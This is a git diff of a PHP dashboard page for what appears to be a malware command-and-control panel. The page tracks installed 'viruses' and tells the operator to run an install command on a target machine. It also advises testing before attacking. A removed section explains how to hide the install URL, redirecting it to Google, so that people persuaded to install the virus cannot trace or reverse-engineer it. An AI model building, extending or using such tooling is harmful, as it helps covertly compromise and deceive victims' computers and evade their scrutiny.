@@ -9,7 +9,6 @@ use Kelvinho\Virus\Virus\VirusFactory;
 use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\formattedTimeSpan;
-use function Kelvinho\Virus\niceCost;
 use function Kelvinho\Virus\niceFileSize;
 
 function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user) {
@@ -23,7 +22,7 @@ function displayTable(array $virus_ids, array $visibleFields, VirusFactory $viru
                     echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
                     echo in_array(1, $visibleFields) ? "<th>Virus id</th>" : "";
                     echo in_array(2, $visibleFields) ? "<th>Last seen</th>" : "";
-                    echo in_array(3, $visibleFields) ? "<th>Usage</th>" : "";
+                    echo in_array(3, $visibleFields) ? "<th>Disk space</th>" : "";
                     echo in_array(4, $visibleFields) ? "<th></th>" : "";
                     ?>
                 </tr>
@@ -60,10 +59,6 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
             color: midnightblue;
         }
 
-        .w3-table td {
-            vertical-align: inherit;
-        }
-
         .hold {
             color: blue;
             cursor: pointer;
@@ -71,6 +66,10 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
     </style>
 </head>
 <body>
+<?php HtmlTemplate::topNavigation(null, null, null, null, $user->isHold()); ?><?php
+if ($user->isHold()) { ?>
+    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span></p>
+<?php } ?>
 <h2>Active viruses</h2>
 <p>These are viruses that are still reporting back pretty quickly (less
     than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
@@ -86,24 +85,6 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
     triggered by accessing the entry point.</p>
 <?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user); ?>
-<h2>Settings</h2>
-<p>Go <a href="<?php echo DOMAIN . "/profile"; ?>" style="color: blue;">here</a> for your account settings and see your
-    billing information</p>
-<h2>Emergency hold</h2>
-<p>Normally, you can install the virus using the command below. What it does is it copies installation instructions from
-    the URL and executes that. However, if you are trying to convince others to willingly install the virus on their
-    computer, they might go to the URL and inspect what's there after they have run it (or before they run it, in which
-    case you're out of luck). They may figure out where the virus is located and may get curious and reverse engineer it
-    and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold it.</p>
-<?php
-if ($user->isHold()) { ?>
-    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a
-                class="hold" onclick="removeHold()">here</a> to
-        remove hold.</p>
-<?php } else { ?>
-    <p>You are currently not holding, meaning you can install new viruses but outsiders can reverse engineer the virus.
-        Click <a class="hold" onclick="applyHold()">here</a> to apply a hold.</p>
-<?php } ?>
 <h2>Installing a new virus</h2>
 To install a new virus on a Windows computer, execute this command in the command prompt on the target machine:
 <pre class="codes"
@@ -149,10 +130,8 @@ And run this for Mac (in development, not available):
 <p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
     to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
     installed properly do you?</p>
-<h2>Deleting a virus</h2>
-<p>When you are done with a virus, you can just press delete, and then you will not be able to access it. The app
-    will also send a kill signal to the virus itself, to make sure every trace of the virus is gone. There will be
-    no oops button, so only delete a virus if you really want to.</p>
+<h2>Frequently Asked Questions</h2>
+<p>Have a question? Head over to the <a href="<?php echo DOMAIN . "/faq"; ?>" style="color: blue;">Frequently Asked Questions site</a>.</p>
 </body>
 <?php HtmlTemplate::scripts(); ?>
 <script type="application/javascript">
@@ -201,6 +180,8 @@ And run this for Mac (in development, not available):
             success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>"
         });
     }
+
+    setInterval(() => window.location = "<?php echo DOMAIN . "/dashboard"; ?>", 60000);
 
     //document.body.requestFullscreen();
     window.scrollTo(0, 1);
